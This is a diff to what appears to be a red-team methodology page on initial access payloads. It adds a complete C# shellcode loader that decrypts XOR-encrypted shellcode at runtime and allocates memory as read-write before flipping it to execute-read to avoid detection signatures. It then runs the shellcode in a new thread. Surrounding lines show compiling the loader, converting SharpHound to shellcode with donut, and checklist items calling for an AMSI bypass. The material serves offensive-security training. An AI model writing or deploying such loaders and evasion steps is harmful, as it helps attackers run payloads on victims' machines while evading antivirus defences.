@@ -10453,6 +10453,49 @@ csc /target:exe /platform:x64 loader.cs
 
 # Convert .NET assembly to shellcode (for injection)
 donut -i SharpHound.exe -o sh.bin -f 1</code></pre>
+<pre><code class="language-csharp">// C# Shellcode Loader Skeleton (OSEP baseline)
+// Two-step alloc: RW then RX — avoids the single-call RWX signature
+using System;
+using System.Runtime.InteropServices;
+
+class Loader {
+    [DllImport("kernel32.dll")]
+    static extern IntPtr VirtualAlloc(IntPtr addr, uint sz,
+        uint type, uint protect);
+    [DllImport("kernel32.dll")]
+    static extern bool VirtualProtect(IntPtr addr, uint sz,
+        uint newProtect, out uint oldProtect);
+    [DllImport("kernel32.dll")]
+    static extern IntPtr CreateThread(IntPtr attr, uint stk,
+        IntPtr start, IntPtr param, uint flags, IntPtr tid);
+    [DllImport("kernel32.dll")]
+    static extern uint WaitForSingleObject(IntPtr h, uint ms);
+
+    static void Main() {
+        // XOR-encrypted shellcode — never store raw bytes
+        byte[] enc = new byte[] { /* paste encrypted shellcode */ };
+        byte[] buf = Decrypt(enc, 0xFA);
+
+        // Allocate RW, copy, then flip to RX
+        IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)buf.Length,
+            0x3000, 0x04);            // MEM_COMMIT|RESERVE, PAGE_READWRITE
+        Marshal.Copy(buf, 0, addr, buf.Length);
+
+        uint old;
+        VirtualProtect(addr, (uint)buf.Length, 0x20, out old); // PAGE_EXECUTE_READ
+
+        IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr,
+            IntPtr.Zero, 0, IntPtr.Zero);
+        WaitForSingleObject(hThread, 0xFFFFFFFF);
+    }
+
+    static byte[] Decrypt(byte[] data, byte key) {
+        byte[] result = new byte[data.Length];
+        for (int i = 0; i &lt; data.Length; i++)
+            result[i] = (byte)(data[i] ^ key);
+        return result;
+    }
+}</code></pre>
   <ul>
     <li><input type="checkbox" data-id="methodology-initial-access-payloads-wf-0-1"> AMSI bypass before any in-process .NET assembly load</li>
     <li><input type="checkbox" data-id="methodology-initial-access-payloads-wf-0-2"> Encrypt shellcode with AES or XOR, decrypt at runtime</li>
